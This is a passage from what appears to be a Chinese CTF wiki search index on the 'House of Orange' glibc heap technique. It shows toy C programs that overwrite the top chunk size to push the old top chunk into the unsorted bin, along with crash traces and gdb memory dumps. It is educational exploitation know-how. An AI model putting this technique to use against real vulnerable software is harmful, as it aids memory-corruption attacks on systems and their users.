bins\u3002\n\n\n\u6211\u4eec\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u8fc7\u7a0b\u7684\u8be6\u7ec6\u60c5\u51b5\uff0c\u6211\u4eec\u5047\u8bbe\u76ee\u524d\u7684top chunk\u5df2\u7ecf\u4e0d\u6ee1\u8db3malloc\u7684\u5206\u914d\u9700\u6c42\u3002\n\u9996\u5148\u6211\u4eec\u5728\u7a0b\u5e8f\u4e2d\u7684\nmalloc\n\u8c03\u7528\u4f1a\u6267\u884c\u5230libc.so\u7684\n_int_malloc\n\u51fd\u6570\u4e2d\uff0c\u5728\n_int_malloc\n\u51fd\u6570\u4e2d\uff0c\u4f1a\u4f9d\u6b21\u68c0\u9a8cfastbin\u3001small bins\u3001unsorted bin\u3001large bins\u662f\u5426\u53ef\u4ee5\u6ee1\u8db3\u5206\u914d\u8981\u6c42\uff0c\u56e0\u4e3a\u5c3a\u5bf8\u95ee\u9898\u8fd9\u4e9b\u90fd\u4e0d\u7b26\u5408\u3002\u63a5\u4e0b\u6765\n_int_malloc\n\u51fd\u6570\u4f1a\u8bd5\u56fe\u4f7f\u7528top chunk\uff0c\u5728\u8fd9\u91cctop chunk\u4e5f\u4e0d\u80fd\u6ee1\u8db3\u5206\u914d\u7684\u8981\u6c42\uff0c\u56e0\u6b64\u4f1a\u6267\u884c\u5982\u4e0b\u5206\u652f\u3002\n\n\n/*\nOtherwise, relay to handle system-dependent cases\n*/\nelse {\n      void *p = sysmalloc(nb, av);\n      if (p != NULL \n __builtin_expect (perturb_byte, 0))\n    alloc_perturb (p, bytes);\n      return p;\n}\n\n\n\n\n\u6b64\u65f6ptmalloc\u5df2\u7ecf\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u7533\u8bf7\u5806\u5185\u5b58\u7684\u64cd\u4f5c\uff0c\u9700\u8981\u6267\u884csysmalloc\u6765\u5411\u7cfb\u7edf\u7533\u8bf7\u66f4\u591a\u7684\u7a7a\u95f4\u3002\n\u4f46\u662f\u5bf9\u4e8e\u5806\u6765\u8bf4\u6709mmap\u548cbrk\u4e24\u79cd\u5206\u914d\u65b9\u5f0f\uff0c\u6211\u4eec\u9700\u8981\u8ba9\u5806\u4ee5brk\u7684\u5f62\u5f0f\u62d3\u5c55\uff0c\u4e4b\u540e\u539f\u6709\u7684top chunk\u4f1a\u88ab\u7f6e\u4e8eunsorted bin\u4e2d\u3002\n\n\n\u7efc\u4e0a\uff0c\u6211\u4eec\u8981\u5b9e\u73b0brk\u62d3\u5c55top chunk\uff0c\u4f46\u662f\u8981\u5b9e\u73b0\u8fd9\u4e2a\u76ee\u7684\u9700\u8981\u7ed5\u8fc7\u4e00\u4e9blibc\u4e2d\u7684check\u3002\n\u9996\u5148\uff0cmalloc\u7684\u5c3a\u5bf8\u4e0d\u80fd\u5927\u4e8e\nmmp_.mmap_threshold\n\n\nif ((unsigned long)(nb) \n= (unsigned long)(mp_.mmap_threshold) \n (mp_.n_mmaps \n mp_.n_mmaps_max))\n\n\n\u5982\u679c\u6240\u9700\u5206\u914d\u7684 chunk \u5927\u5c0f\u5927\u4e8e mmap \u5206\u914d\u9608\u503c\uff0c\u9ed8\u8ba4\u4e3a 128K\uff0c\u5e76\u4e14\u5f53\u524d\u8fdb\u7a0b\u4f7f\u7528 mmap()\u5206\u914d\u7684\u5185\u5b58\u5757\u5c0f\u4e8e\u8bbe\u5b9a\u7684\u6700\u5927\u503c\uff0c\u5c06\u4f7f\u7528 mmap()\u7cfb\u7edf\u8c03\u7528\u76f4\u63a5\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\u3002\n\n\n\u5728sysmalloc\u51fd\u6570\u4e2d\u5b58\u5728\u5bf9top chunk size\u7684check\uff0c\u5982\u4e0b\n\n\nassert((old_top == initial_top(av) \n old_size == 0) ||\n     ((unsigned long) (old_size) \n= MINSIZE \n\n      prev_inuse(old_top) \n\n      ((unsigned long)old_end \n pagemask) == 0));\n\n\n\u8fd9\u91cc\u68c0\u67e5\u4e86top chunk\u7684\u5408\u6cd5\u6027\uff0c\u5982\u679c\u7b2c\u4e00\u6b21\u8c03\u7528\u672c\u51fd\u6570\uff0ctop chunk\u53ef\u80fd\u6ca1\u6709\u521d\u59cb\u5316\uff0c\u6240\u4ee5\u53ef\u80fdold_size\u4e3a0\u3002\n\u5982\u679ctop chunk\u5df2\u7ecf\u521d\u59cb\u5316\u4e86\uff0c\u90a3\u4e48top chunk\u7684\u5927\u5c0f\u5fc5\u987b\u5927\u4e8e\u7b49\u4e8eMINSIZE\uff0c\u56e0\u4e3atop chunk\u4e2d\u5305\u542b\u4e86 fencepost\uff0c\u6240\u4ee5top chunk\u7684\u5927\u5c0f\u5fc5\u987b\u8981\u5927\u4e8eMINSIZE\u3002\u5176\u6b21Top chunk\u5fc5\u987b\u6807\u8bc6\u524d\u4e00\u4e2achunk\u5904\u4e8einuse\u72b6\u6001\uff0c\u5e76\u4e14top chunk\u7684\u7ed3\u675f\u5730\u5740\u5fc5\u5b9a\u662f\u9875\u5bf9\u9f50\u7684\u3002\u6b64\u5916top chunk\u9664\u53bbfencepost\u7684\u5927\u5c0f\u5fc5\u5b9a\u8981\u5c0f\u4e8e\u6240\u9700chunk\u7684\u5927\u5c0f\uff0c\u5426\u5219\u5728_int_malloc()\u51fd\u6570\u4e2d\u4f1a\u4f7f\u7528top chunk\u5206\u5272\u51fachunk\u3002\n\n\n\u6211\u4eec\u603b\u7ed3\u4e00\u4e0b\u4f2a\u9020\u7684top chunk size\u7684\u8981\u6c42\n\n\n1.\u4f2a\u9020\u7684size\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u5185\u5b58\u9875\n\n\n2.size\u8981\u5927\u4e8eMINSIZE(0x10)\n\n\n3.size\u8981\u5c0f\u4e8e\u4e4b\u540e\u7533\u8bf7\u7684chunk size + MINSIZE(0x10)\n\n\n4.size\u7684prev inuse\u4f4d\u5fc5\u987b\u4e3a1\n\n\n\u4e4b\u540e\u539f\u6709\u7684top chunk\u5c31\u4f1a\u6267\u884c\n_int_free\n\u4ece\u800c\u987a\u5229\u8fdb\u5165unsorted bin\u4e2d\u3002\n\n\n\u793a\u4f8b\n\n\n\u8fd9\u91cc\u7ed9\u51fa\u4e86\u4e00\u4e2a\u793a\u4f8b\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u6a21\u62df\u4e86\u4e00\u4e2a\u6ea2\u51fa\u8986\u76d6\u5230top chunk\u7684size\u57df\u3002\u6211\u4eec\u8bd5\u56fe\u628asize\u6539\u5c0f\u4ece\u800c\u5b9e\u73b0brk\u6269\u5c55\uff0c\u5e76\u628a\u539f\u6709\u7684top chunk\u653e\u5165unsorted bin\u4e2d\u3002\n\n\n#define fake_size 0x41\n\nint main(void)\n{\n    void *ptr;\n\n    ptr=malloc(0x10);\n    ptr=(void *)((int)ptr+24);\n\n    *((long long*)ptr)=fake_size; // overwrite top chunk size\n\n    malloc(0x60);\n\n    malloc(0x60);\n}\n\n\n\u8fd9\u91cc\u6211\u4eec\u628atop chunk\u7684size\u8986\u76d6\u4e3a0x41\u3002\u4e4b\u540e\u7533\u8bf7\u5927\u4e8e\u8fd9\u4e2a\u5c3a\u5bf8\u7684\u5806\u5757\uff0c\u53730x60\u3002\n\u4f46\u662f\u5f53\u6211\u4eec\u6267\u884c\u8fd9\u4e2a\u793a\u4f8b\u65f6\u4f1a\u53d1\u73b0\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u5e76\u4e0d\u80fd\u5229\u7528\u6210\u529f\uff0c\u539f\u56e0\u5728\u4e8eassert\u5e76\u6ca1\u6709\u88ab\u6ee1\u8db3\u4ece\u800c\u629b\u51fa\u4e86\u5f02\u5e38\u3002\n\n\n[#0] 0x7ffff7a42428 \u2192 Name: __GI_raise(sig=0x6)\n[#1] 0x7ffff7a4402a \u2192 Name: __GI_abort()\n[#2] 0x7ffff7a8a2e8 \u2192 Name: __malloc_assert(assertion=0x7ffff7b9e150 \n(old_top == initial_top (av) \n old_size == 0) || ((unsigned long) (old_size) \n= MINSIZE \n prev_inuse (old_top) \n ((unsigned long) old_end \n (pagesize - 1)) == 0)\n, file=0x7ffff7b9ab85 \nmalloc.c\n, line=0x95a, function=0x7ffff7b9e998 \n__func__.11509\n \nsysmalloc\n)\n[#3] 0x7ffff7a8e426 \u2192 Name: sysmalloc(nb=0x70, av=0x7ffff7dd1b20 \nmain_arena\n)\n\n\n\n\n\u6b63\u786e\u7684\u793a\u4f8b\n\n\n\u6211\u4eec\u56de\u5934\u6765\u770b\u4e00\u4e0bassert\u7684\u6761\u4ef6\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e4b\u524d\u5217\u51fa\u7684\u6761\u76ee\u90fd\u88ab\u6ee1\u8db3\u4e86\u9664\u4e86\u7b2c\u4e00\u6761\u3002\n\n\n1.\u4f2a\u9020\u7684size\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u5185\u5b58\u9875\n\n\n\n\n\u4ec0\u4e48\u662f\u5bf9\u9f50\u5230\u5185\u5b58\u9875\u5462\uff1f\u6211\u4eec\u77e5\u9053\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u90fd\u662f\u4ee5\u5185\u5b58\u9875\u4e3a\u5355\u4f4d\u8fdb\u884c\u5185\u5b58\u7ba1\u7406\u7684\uff0c\u4e00\u822c\u5185\u5b58\u9875\u7684\u5927\u5c0f\u662f4kb\u3002\u90a3\u4e48\u6211\u4eec\u4f2a\u9020\u7684size\u5c31\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u8fd9\u4e2a\u5c3a\u5bf8\u3002\u5728\u8986\u76d6\u4e4b\u524dtop chunk\u7684size\u5927\u5c0f\u662f20fe1\uff0c\u901a\u8fc7\u8ba1\u7b97\u5f97\u77e50x602020+0x20fe0=0x623000\u662f\u5bf9\u4e8e0x1000\uff084kb\uff09\u5bf9\u9f50\u7684\u3002\n\n\n0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1 \n== top chunk\n0x602030:   0x0000000000000000  0x0000000000000000\n\n\n\u56e0\u6b64\u6211\u4eec\u4f2a\u9020\u7684fake_size\u53ef\u4ee5\u662f0x0fe1\u30010x1fe1\u30010x2fe1\u30010x3fe1\u7b49\u5bf94kb\u5bf9\u9f50\u7684size\u3002\u800c0x40\u4e0d\u6ee1\u8db3\u5bf9\u9f50\uff0c\u56e0\u6b64\u4e0d\u80fd\u5b9e\u73b0\u5229\u7528\u3002\n\n\n#define fake_size 0x1fe1\n\nint main(void)\n{\n    void *ptr;\n\n    ptr=malloc(0x10);\n    ptr=(void *)((int)ptr+24);\n\n    *((long long*)ptr)=fake_size;\n\n    malloc(0x2000);\n\n    malloc(0x60);\n}\n\n\n\n\n\u8fdb\u884c\u5206\u914d\u4e4b\u540e\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5230\u539f\u6765\u7684\u5806\u7ecf\u8fc7\u4e86brk\u6269\u5c55\n\n\n//\u539f\u6709\u7684\u5806\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n\n//\u7ecf\u8fc7\u6269\u5c55\u7684\u5806\n0x0000000000602000 0x0000000000646000 0x0000000000000000 rw- [heap]\n\n\n\n\n\u6211\u4eec\u7684\u7533\u8bf7\u88ab\u5206\u914d\u52300x623010\u7684\u4f4d\u7f6e\uff0c\u540c\u65f6\u539f\u6709\u7684\u5806\u88ab\u7f6e\u5165unsorted bin\n\n\n[+] unsorted_bins[0]: fw=0x602020, bk=0x602020\n \u2192   Chunk(addr=0x602030, size=0x1fc0, flags=PREV_INUSE)\n\n\n\n\n\u56e0\u4e3aunsorted bin\u4e2d\u5b58\u5728\u5757\uff0c\u6240\u4ee5\u6211\u4eec\u4e00\u4e0b\u6b21\u7684\u5206\u914d\u4f1a\u5207\u5272\u8fd9\u4e2a\u5757\n\n\n malloc(0x60);\n 0x602030\n\n[+] unsorted_bins[0]: fw=0x602090, bk=0x602090\n \u2192   Chunk(addr=0x6020a0, size=0x1f50, flags=PREV_INUSE)\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\u5206\u914d\u7684\u5185\u5b58\u662f\u4eceunsorted bin\u4e2d\u5207\u5272\u7684\uff0c\u5185\u5b58\u5e03\u5c40\u5982\u4e0b\n\n\n0x602030:   0x00007ffff7dd2208  0x00007ffff7dd2208 \n== \u672a\u88ab\u6e05\u96f6\u7684unsorted bin\u94fe\u8868\n0x602040:   0x0000000000602020  0x0000000000602020\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000001f51 \n== \u5207\u5272\u5269\u4e0b\u7684\u65b0unsorted bin\n0x6020a0:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x6020b0:   0x0000000000000000  0x0000000000000000\n\n\n\n\n\u5176\u5b9ehouse of orange\u7684\u8981\u70b9\u6b63\u5728\u4e8e\u6b64\uff0c\u4e4b\u540e\u7684\u5229\u7528\u56e0\u4e3a\u6d89\u53ca\u5230_IO_FILE\u7684\u77e5\u8bc6\uff0c\u653e\u5230IO_FILE\u72ec\u7acb\u7ae0\u8282\u5206\u4eab\u3002", 
            "title": "House of Orange"
        }, 
        {
            "location": "/pwn/heap/house_of_orange/#house-of-orange", 
            "text": "", 
            "title": "House of Orange"
        }, 
        {
            "location": "/pwn/heap/house_of_orange/#_1", 
            "text": "House of Orange\u4e0e\u5176\u4ed6\u7684House of XX\u5229\u7528\u65b9\u6cd5\u4e0d\u540c\uff0c\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u6765\u81ea\u4e8eHitcon CTF 2016\u4e2d\u7684\u4e00\u9053\u540c\u540d\u9898\u76ee\u3002\u7531\u4e8e\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u5728\u6b64\u524d\u7684CTF\u9898\u76ee\u4e2d\u6ca1\u6709\u51fa\u73b0\u8fc7\uff0c\u56e0\u6b64\u4e4b\u540e\u51fa\u73b0\u7684\u4e00\u7cfb\u5217\u884d\u751f\u9898\u76ee\u7684\u5229\u7528\u65b9\u6cd5\u6211\u4eec\u79f0\u4e4b\u4e3aHouse of Orange\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/house_of_orange/#_2", 
            "text": "House of Orange\u7684\u5229\u7528\u6bd4\u8f83\u7279\u6b8a\uff0c\u9996\u5148\u9700\u8981\u76ee\u6807\u6f0f\u6d1e\u662f\u5806\u4e0a\u7684\u6f0f\u6d1e\u4f46\u662f\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\u9898\u76ee\u4e2d\u4e0d\u5b58\u5728free\u51fd\u6570\u6216\u5176\u4ed6\u91ca\u653e\u5806\u5757\u7684\u51fd\u6570\u3002\u6211\u4eec\u77e5\u9053\u4e00\u822c\u60f3\u8981\u5229\u7528\u5806\u6f0f\u6d1e\uff0c\u9700\u8981\u5bf9\u5806\u5757\u8fdb\u884cmalloc\u548cfree\u64cd\u4f5c\uff0c\u4f46\u662f\u5728House of Orange\u5229\u7528\u4e2d\u65e0\u6cd5\u4f7f\u7528free\u51fd\u6570\uff0c\u56e0\u6b64House of Orange\u6838\u5fc3\u5c31\u662f\u901a\u8fc7\u6f0f\u6d1e\u5229\u7528\u83b7\u5f97free\u7684\u6548\u679c\u3002", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/heap/house_of_orange/#_3", 
            "text": "\u5982\u6211\u4eec\u524d\u9762\u6240\u8ff0\uff0cHouse of Orange\u7684\u6838\u5fc3\u5728\u4e8e\u5728\u6ca1\u6709free\u51fd\u6570\u7684\u60c5\u51b5\u4e0b\u5f97\u5230\u4e00\u4e2a\u91ca\u653e\u7684\u5806\u5757(unsorted bin)\u3002\n\u8fd9\u79cd\u64cd\u4f5c\u7684\u539f\u7406\u7b80\u5355\u6765\u8bf4\u662f\u5f53\u524d\u5806\u7684top chunk\u5c3a\u5bf8\u4e0d\u8db3\u4ee5\u6ee1\u8db3\u7533\u8bf7\u5206\u914d\u7684\u5927\u5c0f\u7684\u65f6\u5019\uff0c\u539f\u6765\u7684top chunk\u4f1a\u88ab\u91ca\u653e\u5e76\u88ab\u7f6e\u5165unsorted bin\u4e2d\uff0c\u901a\u8fc7\u8fd9\u4e00\u70b9\u53ef\u4ee5\u5728\u6ca1\u6709free\u51fd\u6570\u60c5\u51b5\u4e0b\u83b7\u53d6\u5230unsorted bins\u3002  \u6211\u4eec\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u8fc7\u7a0b\u7684\u8be6\u7ec6\u60c5\u51b5\uff0c\u6211\u4eec\u5047\u8bbe\u76ee\u524d\u7684top chunk\u5df2\u7ecf\u4e0d\u6ee1\u8db3malloc\u7684\u5206\u914d\u9700\u6c42\u3002\n\u9996\u5148\u6211\u4eec\u5728\u7a0b\u5e8f\u4e2d\u7684 malloc \u8c03\u7528\u4f1a\u6267\u884c\u5230libc.so\u7684 _int_malloc \u51fd\u6570\u4e2d\uff0c\u5728 _int_malloc \u51fd\u6570\u4e2d\uff0c\u4f1a\u4f9d\u6b21\u68c0\u9a8cfastbin\u3001small bins\u3001unsorted bin\u3001large bins\u662f\u5426\u53ef\u4ee5\u6ee1\u8db3\u5206\u914d\u8981\u6c42\uff0c\u56e0\u4e3a\u5c3a\u5bf8\u95ee\u9898\u8fd9\u4e9b\u90fd\u4e0d\u7b26\u5408\u3002\u63a5\u4e0b\u6765 _int_malloc \u51fd\u6570\u4f1a\u8bd5\u56fe\u4f7f\u7528top chunk\uff0c\u5728\u8fd9\u91cctop chunk\u4e5f\u4e0d\u80fd\u6ee1\u8db3\u5206\u914d\u7684\u8981\u6c42\uff0c\u56e0\u6b64\u4f1a\u6267\u884c\u5982\u4e0b\u5206\u652f\u3002  /*\nOtherwise, relay to handle system-dependent cases\n*/\nelse {\n      void *p = sysmalloc(nb, av);\n      if (p != NULL   __builtin_expect (perturb_byte, 0))\n    alloc_perturb (p, bytes);\n      return p;\n}  \u6b64\u65f6ptmalloc\u5df2\u7ecf\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u7533\u8bf7\u5806\u5185\u5b58\u7684\u64cd\u4f5c\uff0c\u9700\u8981\u6267\u884csysmalloc\u6765\u5411\u7cfb\u7edf\u7533\u8bf7\u66f4\u591a\u7684\u7a7a\u95f4\u3002\n\u4f46\u662f\u5bf9\u4e8e\u5806\u6765\u8bf4\u6709mmap\u548cbrk\u4e24\u79cd\u5206\u914d\u65b9\u5f0f\uff0c\u6211\u4eec\u9700\u8981\u8ba9\u5806\u4ee5brk\u7684\u5f62\u5f0f\u62d3\u5c55\uff0c\u4e4b\u540e\u539f\u6709\u7684top chunk\u4f1a\u88ab\u7f6e\u4e8eunsorted bin\u4e2d\u3002  \u7efc\u4e0a\uff0c\u6211\u4eec\u8981\u5b9e\u73b0brk\u62d3\u5c55top chunk\uff0c\u4f46\u662f\u8981\u5b9e\u73b0\u8fd9\u4e2a\u76ee\u7684\u9700\u8981\u7ed5\u8fc7\u4e00\u4e9blibc\u4e2d\u7684check\u3002\n\u9996\u5148\uff0cmalloc\u7684\u5c3a\u5bf8\u4e0d\u80fd\u5927\u4e8e mmp_.mmap_threshold  if ((unsigned long)(nb)  = (unsigned long)(mp_.mmap_threshold)   (mp_.n_mmaps   mp_.n_mmaps_max)) \n\u5982\u679c\u6240\u9700\u5206\u914d\u7684 chunk \u5927\u5c0f\u5927\u4e8e mmap \u5206\u914d\u9608\u503c\uff0c\u9ed8\u8ba4\u4e3a 128K\uff0c\u5e76\u4e14\u5f53\u524d\u8fdb\u7a0b\u4f7f\u7528 mmap()\u5206\u914d\u7684\u5185\u5b58\u5757\u5c0f\u4e8e\u8bbe\u5b9a\u7684\u6700\u5927\u503c\uff0c\u5c06\u4f7f\u7528 mmap()\u7cfb\u7edf\u8c03\u7528\u76f4\u63a5\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\u3002  \u5728sysmalloc\u51fd\u6570\u4e2d\u5b58\u5728\u5bf9top chunk size\u7684check\uff0c\u5982\u4e0b  assert((old_top == initial_top(av)   old_size == 0) ||\n     ((unsigned long) (old_size)  = MINSIZE  \n      prev_inuse(old_top)  \n      ((unsigned long)old_end   pagemask) == 0)); \n\u8fd9\u91cc\u68c0\u67e5\u4e86top chunk\u7684\u5408\u6cd5\u6027\uff0c\u5982\u679c\u7b2c\u4e00\u6b21\u8c03\u7528\u672c\u51fd\u6570\uff0ctop chunk\u53ef\u80fd\u6ca1\u6709\u521d\u59cb\u5316\uff0c\u6240\u4ee5\u53ef\u80fdold_size\u4e3a0\u3002\n\u5982\u679ctop chunk\u5df2\u7ecf\u521d\u59cb\u5316\u4e86\uff0c\u90a3\u4e48top chunk\u7684\u5927\u5c0f\u5fc5\u987b\u5927\u4e8e\u7b49\u4e8eMINSIZE\uff0c\u56e0\u4e3atop chunk\u4e2d\u5305\u542b\u4e86 fencepost\uff0c\u6240\u4ee5top chunk\u7684\u5927\u5c0f\u5fc5\u987b\u8981\u5927\u4e8eMINSIZE\u3002\u5176\u6b21Top chunk\u5fc5\u987b\u6807\u8bc6\u524d\u4e00\u4e2achunk\u5904\u4e8einuse\u72b6\u6001\uff0c\u5e76\u4e14top chunk\u7684\u7ed3\u675f\u5730\u5740\u5fc5\u5b9a\u662f\u9875\u5bf9\u9f50\u7684\u3002\u6b64\u5916top chunk\u9664\u53bbfencepost\u7684\u5927\u5c0f\u5fc5\u5b9a\u8981\u5c0f\u4e8e\u6240\u9700chunk\u7684\u5927\u5c0f\uff0c\u5426\u5219\u5728_int_malloc()\u51fd\u6570\u4e2d\u4f1a\u4f7f\u7528top chunk\u5206\u5272\u51fachunk\u3002  \u6211\u4eec\u603b\u7ed3\u4e00\u4e0b\u4f2a\u9020\u7684top chunk size\u7684\u8981\u6c42  1.\u4f2a\u9020\u7684size\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u5185\u5b58\u9875  2.size\u8981\u5927\u4e8eMINSIZE(0x10)  3.size\u8981\u5c0f\u4e8e\u4e4b\u540e\u7533\u8bf7\u7684chunk size + MINSIZE(0x10)  4.size\u7684prev inuse\u4f4d\u5fc5\u987b\u4e3a1  \u4e4b\u540e\u539f\u6709\u7684top chunk\u5c31\u4f1a\u6267\u884c _int_free \u4ece\u800c\u987a\u5229\u8fdb\u5165unsorted bin\u4e2d\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/house_of_orange/#_4", 
            "text": "\u8fd9\u91cc\u7ed9\u51fa\u4e86\u4e00\u4e2a\u793a\u4f8b\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u6a21\u62df\u4e86\u4e00\u4e2a\u6ea2\u51fa\u8986\u76d6\u5230top chunk\u7684size\u57df\u3002\u6211\u4eec\u8bd5\u56fe\u628asize\u6539\u5c0f\u4ece\u800c\u5b9e\u73b0brk\u6269\u5c55\uff0c\u5e76\u628a\u539f\u6709\u7684top chunk\u653e\u5165unsorted bin\u4e2d\u3002  #define fake_size 0x41\n\nint main(void)\n{\n    void *ptr;\n\n    ptr=malloc(0x10);\n    ptr=(void *)((int)ptr+24);\n\n    *((long long*)ptr)=fake_size; // overwrite top chunk size\n\n    malloc(0x60);\n\n    malloc(0x60);\n} \n\u8fd9\u91cc\u6211\u4eec\u628atop chunk\u7684size\u8986\u76d6\u4e3a0x41\u3002\u4e4b\u540e\u7533\u8bf7\u5927\u4e8e\u8fd9\u4e2a\u5c3a\u5bf8\u7684\u5806\u5757\uff0c\u53730x60\u3002\n\u4f46\u662f\u5f53\u6211\u4eec\u6267\u884c\u8fd9\u4e2a\u793a\u4f8b\u65f6\u4f1a\u53d1\u73b0\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u5e76\u4e0d\u80fd\u5229\u7528\u6210\u529f\uff0c\u539f\u56e0\u5728\u4e8eassert\u5e76\u6ca1\u6709\u88ab\u6ee1\u8db3\u4ece\u800c\u629b\u51fa\u4e86\u5f02\u5e38\u3002  [#0] 0x7ffff7a42428 \u2192 Name: __GI_raise(sig=0x6)\n[#1] 0x7ffff7a4402a \u2192 Name: __GI_abort()\n[#2] 0x7ffff7a8a2e8 \u2192 Name: __malloc_assert(assertion=0x7ffff7b9e150  (old_top == initial_top (av)   old_size == 0) || ((unsigned long) (old_size)  = MINSIZE   prev_inuse (old_top)   ((unsigned long) old_end   (pagesize - 1)) == 0) , file=0x7ffff7b9ab85  malloc.c , line=0x95a, function=0x7ffff7b9e998  __func__.11509   sysmalloc )\n[#3] 0x7ffff7a8e426 \u2192 Name: sysmalloc(nb=0x70, av=0x7ffff7dd1b20  main_arena )", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/heap/house_of_orange/#_5", 
            "text": "\u6211\u4eec\u56de\u5934\u6765\u770b\u4e00\u4e0bassert\u7684\u6761\u4ef6\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e4b\u524d\u5217\u51fa\u7684\u6761\u76ee\u90fd\u88ab\u6ee1\u8db3\u4e86\u9664\u4e86\u7b2c\u4e00\u6761\u3002  1.\u4f2a\u9020\u7684size\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u5185\u5b58\u9875  \u4ec0\u4e48\u662f\u5bf9\u9f50\u5230\u5185\u5b58\u9875\u5462\uff1f\u6211\u4eec\u77e5\u9053\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u90fd\u662f\u4ee5\u5185\u5b58\u9875\u4e3a\u5355\u4f4d\u8fdb\u884c\u5185\u5b58\u7ba1\u7406\u7684\uff0c\u4e00\u822c\u5185\u5b58\u9875\u7684\u5927\u5c0f\u662f4kb\u3002\u90a3\u4e48\u6211\u4eec\u4f2a\u9020\u7684size\u5c31\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u8fd9\u4e2a\u5c3a\u5bf8\u3002\u5728\u8986\u76d6\u4e4b\u524dtop chunk\u7684size\u5927\u5c0f\u662f20fe1\uff0c\u901a\u8fc7\u8ba1\u7b97\u5f97\u77e50x602020+0x20fe0=0x623000\u662f\u5bf9\u4e8e0x1000\uff084kb\uff09\u5bf9\u9f50\u7684\u3002  0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1  == top chunk\n0x602030:   0x0000000000000000  0x0000000000000000 \n\u56e0\u6b64\u6211\u4eec\u4f2a\u9020\u7684fake_size\u53ef\u4ee5\u662f0x0fe1\u30010x1fe1\u30010x2fe1\u30010x3fe1\u7b49\u5bf94kb\u5bf9\u9f50\u7684size\u3002\u800c0x40\u4e0d\u6ee1\u8db3\u5bf9\u9f50\uff0c\u56e0\u6b64\u4e0d\u80fd\u5b9e\u73b0\u5229\u7528\u3002  #define fake_size 0x1fe1\n\nint main(void)\n{\n    void *ptr;\n\n    ptr=malloc(0x10);\n    ptr=(void *)((int)ptr+24);\n\n    *((long long*)ptr)=fake_size;\n\n    malloc(0x2000);\n\n    malloc(0x60);\n}  \u8fdb\u884c\u5206\u914d\u4e4b\u540e\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5230\u539f\u6765\u7684\u5806\u7ecf\u8fc7\u4e86brk\u6269\u5c55  //\u539f\u6709\u7684\u5806\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n\n//\u7ecf\u8fc7\u6269\u5c55\u7684\u5806\n0x0000000000602000 0x0000000000646000 0x0000000000000000 rw- [heap]  \u6211\u4eec\u7684\u7533\u8bf7\u88ab\u5206\u914d\u52300x623010\u7684\u4f4d\u7f6e\uff0c\u540c\u65f6\u539f\u6709\u7684\u5806\u88ab\u7f6e\u5165unsorted bin  [+] unsorted_bins[0]: fw=0x602020, bk=0x602020\n \u2192   Chunk(addr=0x602030, size=0x1fc0, flags=PREV_INUSE)  \u56e0\u4e3aunsorted bin\u4e2d\u5b58\u5728\u5757\uff0c\u6240\u4ee5\u6211\u4eec\u4e00\u4e0b\u6b21\u7684\u5206\u914d\u4f1a\u5207\u5272\u8fd9\u4e2a\u5757   malloc(0x60);\n 0x602030\n\n[+] unsorted_bins[0]: fw=0x602090, bk=0x602090\n \u2192   Chunk(addr=0x6020a0, size=0x1f50, flags=PREV_INUSE)  \u53ef\u4ee5\u770b\u5230\u5206\u914d\u7684\u5185\u5b58\u662f\u4eceunsorted bin\u4e2d\u5207\u5272\u7684\uff0c\u5185\u5b58\u5e03\u5c40\u5982\u4e0b  0x602030:   0x00007ffff7dd2208  0x00007ffff7dd2208  == \u672a\u88ab\u6e05\u96f6\u7684unsorted bin\u94fe\u8868\n0x602040:   0x0000000000602020  0x0000000000602020\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000001f51  == \u5207\u5272\u5269\u4e0b\u7684\u65b0unsorted bin\n0x6020a0:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x6020b0:   0x0000000000000000  0x0000000000000000  \u5176\u5b9ehouse of 